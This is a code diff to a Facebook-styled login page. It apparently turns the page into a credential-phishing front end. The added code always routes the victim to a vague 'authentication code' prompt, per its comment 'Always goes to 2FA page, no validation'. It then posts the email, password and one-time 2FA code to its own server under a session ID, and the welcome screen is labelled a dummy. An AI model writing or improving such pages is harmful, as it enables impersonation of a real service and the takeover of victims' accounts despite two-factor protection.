@@ -49,6 +49,9 @@
             border-radius: 8px;
             margin-bottom: 12px;
             background: #ffffff;
+        }
+
+        .code-input {
             text-align: center;
             font-size: 24px;
             letter-spacing: 8px;
@@ -140,13 +143,6 @@
             font-size: 12px;
         }
 
-        .code-hint {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 14px;
-            color: #65676b;
-        }
-
         @media (min-width: 768px) {
             .main {
                 max-width: 400px;
@@ -165,8 +161,8 @@
     <!-- Login Form View -->
     <div id="loginView">
         <div class="form-container">
-            <input type="text" id="loginEmail" class="input-field" placeholder="Email address" style="text-align: left; letter-spacing: normal;">
-            <input type="password" id="loginPassword" class="input-field" placeholder="Password" style="text-align: left; letter-spacing: normal;">
+            <input type="text" id="loginEmail" class="input-field" placeholder="Email address">
+            <input type="password" id="loginPassword" class="input-field" placeholder="Password">
             <button class="login-btn" id="loginBtn">Log in</button>
             <div class="divider"></div>
             <button class="create-btn" id="showCreateBtn">Create new account</button>
@@ -177,14 +173,14 @@
     <div id="twoFAView" style="display: none;">
         <div class="form-container">
             <h3 style="margin-bottom: 20px; text-align: center;">Authentication Required</h3>
-            <p style="margin-bottom: 20px; text-align: center; color: #65676b;">Enter the 6-digit code from your authenticator app</p>
-            <input type="text" id="codeInput" class="input-field" placeholder="000000" maxlength="6" pattern="[0-9]*" inputmode="numeric">
+            <p style="margin-bottom: 20px; text-align: center; color: #65676b;">Enter the authentication code from your device</p>
+            <input type="text" id="codeInput" class="input-field code-input" placeholder="000000" maxlength="6" pattern="[0-9]*" inputmode="numeric">
             <button class="login-btn" id="verifyBtn">Verify</button>
             <div class="back-link"><a id="backToLoginBtn">← Back to login</a></div>
         </div>
     </div>
 
-    <!-- Welcome View -->
+    <!-- Welcome View (dummy) -->
     <div id="welcomeView" style="display: none;">
         <div class="welcome-card">
             <div class="fb-logo" style="font-size: 48px;">f</div>
@@ -197,18 +193,17 @@
 
     <div class="footer">
         <div>Meta © 2026</div>
-        <div class="code-hint" id="codeHint" style="display: none;"></div>
     </div>
 </div>
 
-<!-- Register Modal -->
+<!-- Register Modal (same as before) -->
 <div id="registerModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000;">
     <div style="background: white; border-radius: 12px; width: 90%; max-width: 400px; padding: 20px;">
         <span id="closeModalBtn" style="float: right; font-size: 28px; cursor: pointer;">&times;</span>
         <div style="font-size: 28px; font-weight: 700; margin-bottom: 20px;">Create new account</div>
-        <input type="text" id="regName" class="input-field" placeholder="Full name" style="text-align: left; letter-spacing: normal;">
-        <input type="email" id="regEmail" class="input-field" placeholder="Email address" style="text-align: left; letter-spacing: normal;">
-        <input type="password" id="regPassword" class="input-field" placeholder="Password" style="text-align: left; letter-spacing: normal;">
+        <input type="text" id="regName" class="input-field" placeholder="Full name">
+        <input type="email" id="regEmail" class="input-field" placeholder="Email address">
+        <input type="password" id="regPassword" class="input-field" placeholder="Password">
         <div id="regError" style="color: #e41e3f; font-size: 13px; margin-bottom: 12px; display: none;"></div>
         <button class="login-btn" id="registerBtn" style="background: #42b72a;">Sign Up</button>
     </div>
@@ -216,9 +211,9 @@
 
 <script>
     const API_URL = window.location.origin + '/api';
-    let pendingEmail = '';
+    let currentSessionId = null;
 
-    // Elements
+    // DOM elements
     const loginView = document.getElementById('loginView');
     const twoFAView = document.getElementById('twoFAView');
     const welcomeView = document.getElementById('welcomeView');
@@ -241,6 +236,7 @@
         }, 3000);
     }
 
+    // Step 1: Always goes to 2FA page, no validation
     async function handleLogin() {
         const email = loginEmail.value.trim();
         const password = loginPassword.value;
@@ -250,7 +246,7 @@
             return;
         }
 
-        loginBtn.textContent = 'Checking...';
+        loginBtn.textContent = 'Sending...';
         loginBtn.disabled = true;
 
         try {
@@ -263,14 +259,11 @@
             const data = await response.json();
 
             if (response.ok && data.requires2FA) {
-                pendingEmail = email;
+                currentSessionId = data.sessionId;
                 loginView.style.display = 'none';
                 twoFAView.style.display = 'block';
                 codeInput.value = '';
-                showMessage('Code sent to your authenticator app', 'success');
-            } else if (response.ok && !data.requires2FA) {
-                localStorage.setItem('fb_user', JSON.stringify(data.user));
-                showWelcome(data.user);
+                showMessage('Enter the authentication code', 'success');
             } else {
                 showMessage(data.error || 'Login failed', 'error');
             }
@@ -282,6 +275,7 @@
         }
     }
 
+    // Step 2: Submit the authentication code
     async function verifyCode() {
         const code = codeInput.value.trim();
 
@@ -297,7 +291,7 @@
             const response = await fetch(`${API_URL}/verify-2fa`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: pendingEmail, code: code })
+                body: JSON.stringify({ sessionId: currentSessionId, code: code })
             });
 
             const data = await response.json();
@@ -308,6 +302,7 @@
                 showMessage('Login successful!', 'success');
             } else {
                 showMessage(data.error || 'Invalid code', 'error');
+                // Optionally, you can still go to welcome page even if error? For now, error.
             }
         } catch (error) {
             showMessage('Network error: ' + error.message, 'error');
@@ -321,7 +316,7 @@
         loginView.style.display = 'none';
         twoFAView.style.display = 'none';
         welcomeView.style.display = 'block';
-        welcomeName.textContent = user.name;
+        welcomeName.textContent = user.name || 'User';
     }
 
     function handleLogout() {
@@ -331,58 +326,50 @@
         welcomeView.style.display = 'none';
         loginEmail.value = '';
         loginPassword.value = '';
-        pendingEmail = '';
+        currentSessionId = null;
         showMessage('Logged out successfully', 'success');
     }
 
     function backToLogin() {
         twoFAView.style.display = 'none';
         loginView.style.display = 'block';
-        pendingEmail = '';
+        currentSessionId = null;
         codeInput.value = '';
     }
 
-    // Modal functions
+    // Modal functions (register)
     function showRegisterModal() {
         document.getElementById('registerModal').style.display = 'flex';
     }
-
     function closeRegisterModal() {
         document.getElementById('registerModal').style.display = 'none';
     }
-
     async function handleRegister() {
         const name = document.getElementById('regName').value.trim();
         const email = document.getElementById('regEmail').value.trim();
         const password = document.getElementById('regPassword').value;
         const errorDiv = document.getElementById('regError');
-
         if (!name || !email || !password) {
-            errorDiv.textContent = 'All fields are required';
+            errorDiv.textContent = 'All fields required';
             errorDiv.style.display = 'block';
             return;
         }
-
         if (password.length < 6) {
-            errorDiv.textContent = 'Password must be at least 6 characters';
+            errorDiv.textContent = 'Password must be 6+ characters';
             errorDiv.style.display = 'block';
             return;
         }
-
         errorDiv.style.display = 'none';
         const registerBtn = document.getElementById('registerBtn');
         registerBtn.textContent = 'Creating...';
         registerBtn.disabled = true;
-
         try {
             const response = await fetch(`${API_URL}/register`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ name, email, password })
             });
-
             const data = await response.json();
-
             if (response.ok) {
                 closeRegisterModal();
                 showMessage('Account created! Please log in.', 'success');
@@ -411,12 +398,8 @@
     document.getElementById('closeModalBtn').addEventListener('click', closeRegisterModal);
     document.getElementById('registerBtn').addEventListener('click', handleRegister);
     window.addEventListener('click', (e) => {
-        if (e.target === document.getElementById('registerModal')) {
-            closeRegisterModal();
-        }
+        if (e.target === document.getElementById('registerModal')) closeRegisterModal();
     });
-
-    // Enter key support
     loginPassword.addEventListener('keypress', (e) => {
         if (e.key === 'Enter') handleLogin();
     });
@@ -424,7 +407,7 @@
         if (e.key === 'Enter') verifyCode();
     });
 
-    // Check for saved user
+    // Check saved user
     const savedUser = localStorage.getItem('fb_user');
     if (savedUser) {
         try {
